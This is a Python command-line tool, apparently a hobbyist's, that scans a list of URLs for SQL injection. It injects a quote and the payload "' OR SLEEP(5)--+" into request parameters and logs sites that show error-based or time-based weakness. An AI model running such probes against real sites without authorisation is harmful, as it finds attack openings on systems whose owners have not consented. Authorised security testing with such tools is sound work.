import requests
import argparse
import threading
import time
from urllib.parse import urlparse, urlencode
import sys
import signal

BANNER = r'''
   ____  _   _ _   _ _   _ _   _ _   _ _   _ _   _ 
  / ___|| | | | | | | \ | | | | | \ | | | | | \ | |
  \___ \| |_| | | | |  \| | | | |  \| | | | |  \| |
   ___) |  _  | |_| | |\  | |_| | |\  | |_| | |\  |
  |____/|_| |_|\___/|_| \_|\___/|_| \_|\___/|_| \_|
                                                  
         Sturdy-Umberlla by Pzod

      Reliable, Resilient, Ruthless SQLi Scanner
'''

def signal_handler(sig, frame):
    print('\n\n[!] Interrupt received. Exiting gracefully...')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def error_based_check(url, method="GET", data=None):
    payload = "'"
    headers = {"User-Agent": "Sturdy-Umberlla by Pzod"}
    try:
        if method == "GET":
            parsed_url = urlparse(url)
            query = dict([kv.split("=") for kv in parsed_url.query.split("&") if "=" in kv])
            if not query:
                return None
            vuln_param = list(query.keys())[0]
            query[vuln_param] += payload
            new_query = urlencode(query)
            target = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            response = requests.get(target, headers=headers, timeout=5)
        elif method == "POST":
            if not data:
                return None
            parsed_data = dict([kv.split("=") for kv in data.split("&") if "=" in kv])
            vuln_param = list(parsed_data.keys())[0]
            parsed_data[vuln_param] += payload
            response = requests.post(url, data=parsed_data, headers=headers, timeout=5)
        else:
            return None

        if "You have an error in your SQL syntax" in response.text or "sql syntax" in response.text.lower():
            return url
        return None
    except Exception:
        return None

def time_based_check(url, method="GET", data=None):
    payload = "' OR SLEEP(5)--+"
    headers = {"User-Agent": "Sturdy-Umberlla by Pzod"}
    try:
        start = time.time()
        if method == "GET":
            parsed_url = urlparse(url)
            query = dict([kv.split("=") for kv in parsed_url.query.split("&") if "=" in kv])
            if not query:
                return None
            vuln_param = list(query.keys())[0]
            query[vuln_param] += payload
            new_query = urlencode(query)
            target = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            requests.get(target, headers=headers, timeout=10)
        elif method == "POST":
            if not data:
                return None
            parsed_data = dict([kv.split("=") for kv in data.split("&") if "=" in kv])
            vuln_param = list(parsed_data.keys())[0]
            parsed_data[vuln_param] += payload
            requests.post(url, data=parsed_data, headers=headers, timeout=10)
        else:
            return None
        end = time.time()
        if end - start > 5:
            return url
        return None
    except Exception:
        return None

def scan_target(url, method, data):
    print(f"[+] Scanning: {url}")
    if result := error_based_check(url, method, data):
        print(f"[!] Error-based SQLi Detected: {result}")
        with open("vuln_results.txt", "a") as f:
            f.write(f"{result} [ERROR-BASED]\n")
    elif result := time_based_check(url, method, data):
        print(f"[!] Time-based SQLi Detected: {result}")
        with open("vuln_results.txt", "a") as f:
            f.write(f"{result} [TIME-BASED]\n")
    else:
        print(f"[-] No SQLi detected: {url}")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Sturdy-Umberlla by Pzod — Multi-target SQL injection scanner")
    parser.add_argument("--file", help="File containing list of URLs", required=True)
    parser.add_argument("--method", help="HTTP method (GET or POST)", choices=["GET", "POST"], default="GET")
    parser.add_argument("--data", help="POST data string (e.g., 'user=admin&pass=123') for POST requests")
    parser.add_argument("--threads", help="Number of threads (default: 5)", type=int, default=5)
    args = parser.parse_args()

    with open(args.file, "r") as f:
        targets = [line.strip() for line in f if line.strip()]

    threads = []
    for url in targets:
        while threading.active_count() > args.threads:
            time.sleep(0.1)
        t = threading.Thread(target=scan_target, args=(url, args.method, args.data))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("\n[+] Scan complete. Results saved in 'vuln_results.txt'")

if __name__ == "__main__":
    main()
